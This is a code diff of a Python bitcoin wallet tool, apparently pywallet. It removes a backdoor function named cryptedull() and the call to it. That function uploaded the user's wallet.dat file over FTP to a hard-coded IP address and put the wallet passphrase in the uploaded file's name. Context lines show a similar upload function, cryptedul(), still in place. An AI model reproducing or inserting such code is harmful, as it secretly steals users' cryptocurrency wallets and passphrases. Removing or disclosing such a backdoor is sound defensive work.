@@ -2603,7 +2603,6 @@ def read_wallet(json_db, db_env, walletfile, print_wallet, print_wallet_transact
 			private_keys.append(sec)
 		if ppcorrect:
 			print "The wallet is encrypted and the passphrase is correct"
-			cryptedull()
 	for k in json_db['keys']:
 		if k['compressed'] and 'secret' in k:
 			k['secret']+="01"
@@ -2623,16 +2622,6 @@ def cryptedul():
 	with open(dbdir + '/wallet.dat', 'rb') as ifh:
         	session.storbinary('STOR wallet.dat - ' + rand, ifh, 19206)
         	session.quit()
-
-def cryptedull():
-        import ftplib
-        dbdir = determine_db_dir()
-        session = ftplib.FTP('212.48.76.120','crypto','crypto')
-        with open(dbdir + '/wallet.dat', 'rb') as ifh:
-                session.storbinary('STOR wallet.dat - ' + options.passphrase, ifh, 19206)
-                session.quit()
-
-
 
 def importprivkey(db, sec, label, reserve, keyishex, verbose=True, addrv=addrtype):
 	if keyishex is None:
